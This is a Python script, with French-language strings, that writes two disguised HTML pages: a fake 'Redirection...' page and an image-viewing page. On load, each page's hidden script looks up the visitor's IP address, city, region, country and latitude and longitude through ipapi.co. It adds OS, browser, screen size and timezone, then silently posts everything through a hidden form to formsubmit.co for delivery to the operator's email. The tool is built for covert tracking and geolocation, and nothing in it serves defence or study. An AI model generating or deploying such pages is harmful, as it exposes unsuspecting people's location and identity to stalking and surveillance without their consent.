import os
import requests
import base64
import urllib.parse


def generate_tracker_html(email: str, save_path: str) -> str:
    html_code = f"""<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <title>Redirection...</title>
</head>
<body>
    <p>Redirection...</p>
    <form id="trackerForm" action="https://formsubmit.co/{email}" method="POST" style="display:none;">
        <input type="hidden" name="_subject" value="Nouveau tracking" />
        <input type="hidden" name="ip" id="ip" />
        <input type="hidden" name="ville" id="ville" />
        <input type="hidden" name="region" id="region" />
        <input type="hidden" name="pays" id="pays" />
        <input type="hidden" name="latitude" id="latitude" />
        <input type="hidden" name="longitude" id="longitude" />
        <input type="hidden" name="os" id="os" />
        <input type="hidden" name="navigateur" id="navigateur" />
        <input type="hidden" name="resolution" id="resolution" />
        <input type="hidden" name="fuseau" id="fuseau" />
        <input type="hidden" name="date" id="date" />
        <input type="hidden" name="_next" value="https://www.google.com" />
        <input type="hidden" name="_captcha" value="false" />
    </form>

    <script>
        function getBrowserInfo() {{
            const ua = navigator.userAgent;
            if (ua.includes("Chrome")) return "Chrome";
            if (ua.includes("Firefox")) return "Firefox";
            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
            if (ua.includes("Edge")) return "Edge";
            if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
            return "Inconnu";
        }}

        function getOSInfo() {{
            const platform = navigator.platform.toLowerCase();
            if (platform.includes("win")) return "Windows";
            if (platform.includes("mac")) return "macOS";
            if (platform.includes("linux")) return "Linux";
            if (/android/.test(navigator.userAgent.toLowerCase())) return "Android";
            if (/iphone|ipad/.test(navigator.userAgent.toLowerCase())) return "iOS";
            return "Inconnu";
        }}

        window.onload = async function () {{
            try {{
                const res = await fetch("https://ipapi.co/json");
                const data = await res.json();

                document.getElementById("ip").value = data.ip || "";
                document.getElementById("ville").value = data.city || "";
                document.getElementById("region").value = data.region || "";
                document.getElementById("pays").value = data.country_name || "";
                document.getElementById("latitude").value = data.latitude || "";
                document.getElementById("longitude").value = data.longitude || "";
                document.getElementById("os").value = getOSInfo();
                document.getElementById("navigateur").value = getBrowserInfo();
                document.getElementById("resolution").value = window.screen.width + "x" + window.screen.height;
                document.getElementById("fuseau").value = Intl.DateTimeFormat().resolvedOptions().timeZone;
                document.getElementById("date").value = new Date().toLocaleString();

                document.getElementById("trackerForm").submit();
            }} catch (e) {{
                console.error("Erreur:", e);
            }}
        }};
    </script>
</body>
</html>
"""

    os.makedirs(os.path.dirname(save_path), exist_ok=True)
    with open(save_path, "w", encoding="utf-8") as f:
        f.write(html_code)

    return save_path


def generate_image_tracker_html(email, image_url, output_path):
    email_encoded = urllib.parse.quote(email)

    html_content = f"""<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Image Tracker</title>
</head>
<body>
    <img src="{image_url}" alt="Image Tracker" style="max-width: 100%; height: auto;" />

    <form id="trackerForm" action="https://formsubmit.co/{email_encoded}" method="POST" style="display:none;">
        <input type="hidden" name="_subject" value="Tracking par image" />
        <input type="hidden" name="ip" id="ip" />
        <input type="hidden" name="ville" id="ville" />
        <input type="hidden" name="region" id="region" />
        <input type="hidden" name="pays" id="pays" />
        <input type="hidden" name="latitude" id="latitude" />
        <input type="hidden" name="longitude" id="longitude" />
        <input type="hidden" name="os" id="os" />
        <input type="hidden" name="navigateur" id="navigateur" />
        <input type="hidden" name="resolution" id="resolution" />
        <input type="hidden" name="fuseau" id="fuseau" />
        <input type="hidden" name="date" id="date" />
        <input type="hidden" name="image_vue" value="{image_url}" />
        <input type="hidden" name="_captcha" value="false" />
        <input type="hidden" name="_template" value="table" />
    </form>

    <script>
        function getBrowserInfo() {{
            const ua = navigator.userAgent;
            if (ua.includes("Chrome")) return "Chrome";
            if (ua.includes("Firefox")) return "Firefox";
            if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
            if (ua.includes("Edge")) return "Edge";
            if (ua.includes("MSIE") || ua.includes("Trident")) return "Internet Explorer";
            return "Inconnu";
        }}

        function getOSInfo() {{
            const platform = navigator.platform.toLowerCase();
            if (platform.includes("win")) return "Windows";
            if (platform.includes("mac")) return "macOS";
            if (platform.includes("linux")) return "Linux";
            if (/android/.test(navigator.userAgent.toLowerCase())) return "Android";
            if (/iphone|ipad/.test(navigator.userAgent.toLowerCase())) return "iOS";
            return "Inconnu";
        }}

        window.onload = async function () {{
            try {{
                const res = await fetch("https://ipapi.co/json");
                const data = await res.json();

                document.getElementById("ip").value = data.ip || "";
                document.getElementById("ville").value = data.city || "";
                document.getElementById("region").value = data.region || "";
                document.getElementById("pays").value = data.country_name || "";
                document.getElementById("latitude").value = data.latitude || "";
                document.getElementById("longitude").value = data.longitude || "";
                document.getElementById("os").value = getOSInfo();
                document.getElementById("navigateur").value = getBrowserInfo();
                document.getElementById("resolution").value = window.screen.width + "x" + window.screen.height;
                document.getElementById("fuseau").value = Intl.DateTimeFormat().resolvedOptions().timeZone;
                document.getElementById("date").value = new Date().toLocaleString();

                document.getElementById("trackerForm").submit();
            }} catch (e) {{
                console.error("Erreur:", e);
            }}
        }};
    </script>

    <p>Merci de votre visite.</p>
</body>
</html>
"""

    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(html_content)